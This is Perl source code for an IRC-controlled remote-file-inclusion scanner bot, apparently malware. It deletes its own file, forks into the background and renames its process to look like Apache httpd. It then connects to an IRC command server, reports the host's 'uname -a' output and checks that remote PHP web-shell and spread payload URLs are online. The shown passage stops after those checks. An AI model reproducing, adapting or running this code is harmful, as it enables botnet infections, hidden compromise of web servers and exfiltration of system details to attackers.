#!/usr/bin/perl -w

# NEW RFI SCANNER d35m0 MOD v1.5.2 WITH BYPASS AND CLEAN

############################################################
# My commands:
#
# !info
# !verificaid            [check id]
# !verificacmd           [check cmd]
# !verificaspread        [check spread]
# !chidid [link]         [change id]
# !chidcmd [link]        [change cmd]
# !chidspread [link]     [change spread]
# !mostraid              [show id]
# !mostracmd             [show cmd]
# !milw0rm[num]          [milworm vuls]
# !basekill[num]         [kill bot (pid kill)]
# !base[num]             [Quit irc *windows only please]
# !tmp                   [clean tmp]
############################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
require LWP;
$|++;

# AUTO REMOVER
system "rm -Rf ".$0;
system "del ".$0;
system "rm -f ".$0;
system "rm ".$0;

# CONFIGURATION
my $process   = "/usr/local/apache/bin/httpd";
my $scramble  = int(rand(100)); 
my $command   = "!scan".$scramble;
my $irccmd    = "http://www.lifeofchat.altervista.org/r57.txt???";
my $id        = "http://www.lifeofchat.altervista.org/idrfi.txt?";
my $ircserver = "irc.sistem-root.net";
my $port      = "6666";
my $nickname  = "[ArEa51|RFI|".$scramble."]";
my $channel   = "#Rox";
my $chanres   = "#Rox";
my $spread    = "http://www.lifeofchat.altervista.org/sca.txt??";
my $enter     = "!spread".$scramble;
my $out       = "!bye".$scramble;
my $basekill  = "!basekill".$scramble;
my $milw0rm   = "!milw0rm".$scramble;
my $adm       = "hack`";
my $uname     = `uname -a`;

#######################################################
##################### RFI SCANNER #####################
#######################################################

my $pid = fork;
exit if $pid;
$0 = "$process" . "\0" x 16;

my $dsp = IO::Socket::INET->new(
    PeerAddr => "$ircserver",
    PeerPort => "$port",
    Proto    => "tcp"
) or die "Errore di connessione al server!\n";

$dsp->autoflush(1);
print $dsp "NICK $nickname\r\n";
print $dsp "USER $nickname 8 *  : $uname \r\n";
print $dsp "JOIN $channel\r\n";
print $dsp "JOIN $chanres\r\n";
print $dsp "PRIVMSG $chanres :9[ 15RFi STaRTeD 9] 15CHANNEL: 7 $channel 9¤0¤4¤ 15Uname -a:4 $uname \n";
sleep(1);

while ( $line = <$dsp> ) {

    $line =~ s/\r\n$//;
    if ( $line =~ /^PING \:(.*)/ ) {
	print "PONG :$1";
	print $dsp "PONG :$1";
    }

    if ( $line =~ /d35m0(.*) PRIVMSG $channel :!fuckoff/ ) {
	&display( $dsp, "Quit");
	exit(0);
    }
	
    if ( $line =~ /\:$out/ ) {
	&display( $dsp, "Quit");
	exit(0);
    }

    if ( $line =~ /PRIVMSG $channel :!verificaid/ ) {
	my $verifica = $id;
	my $req    = HTTP::Request->new( GET => $verifica );
	my $ua     = LWP::UserAgent->new();
	$ua->timeout(5);
	my $response = $ua->request($req);
	if ( $response->is_success ) {
		my $re = $response->content;
		if ( $re =~ /<\?php/ ) {
			sleep(1);
			&display( $dsp, "PRIVMSG $channel :4(0ID TEST4)0 the id is Online");
		}
	}
	else {
		sleep(1);
		&display( $dsp, "PRIVMSG $channel :4(0ID TEST4)0 the id is not working !!");
	}
    }


	if ( $line =~ /PRIVMSG $channel :!verificacmd/ ) {
 my $verificacmd = $irccmd;
 my $req    = HTTP::Request->new( GET => $verificacmd );
 my $ua     = LWP::UserAgent->new();
 $ua->timeout(5);
 my $response = $ua->request($req);
 if ( $response->is_success ) {
     my $re = $response->content;
     if ( $re =~ /<\?php/ ) {
  sleep(1);
  &display( $dsp, "PRIVMSG $channel :4(0CMD TEST4)0 the CMD is Online");
     }
 }
 else {
     sleep(1);
     &display( $dsp, "PRIVMSG $channel :4(0CMD TEST4)0 the CMD is not working !!");
 }
    }


    if ( $line =~ /PRIVMSG $channel :!verificaspread/ )
    {
 my $verificaspread = $spread;
 my $req    = HTTP::Request->new( GET => $verificaspread );
 my $ua     = LWP::UserAgent->new();
 $ua->timeout(5);
 my $response = $ua->request($req);
 if ( $response->is_success ) {
     my $re = $response->content;
     if ( $re =~ /<\?/ ) {
  sleep(1);
  &display( $dsp, "PRIVMSG $channel :4(0Spread TEST4)0 the Spread is Online");
     }
 }
 else {
     sleep(1);
     &display( $dsp, "PRIVMSG $channel :4(0Spread TEST4)0 the Spread is not working !!");
 }
    }

